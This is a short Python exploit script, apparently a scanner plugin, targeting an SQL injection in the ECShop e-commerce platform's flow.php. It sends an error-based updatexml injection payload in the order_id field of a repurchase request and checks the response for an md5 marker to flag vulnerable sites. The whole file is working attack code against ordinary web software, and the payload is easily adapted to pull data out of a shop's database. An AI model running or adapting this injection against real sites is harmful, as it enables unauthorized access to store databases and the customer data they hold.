# coding:utf-8
# ecshop flow.php SQL Injection
import requests
import re

class Exploit:

    payload = "/flow.php?step=repurchase"
    post_data = {"order_id":"1 or updatexml(1,concat(0x7e,(md5(123))),0) or 11#"}
    comp = r'202cb962ac59075b964b07152d234b7'

    def attack(self, url):
        response = requests.post(url+self.payload, data=self.post_data)
        if re.search(self.comp, response.content):
            return url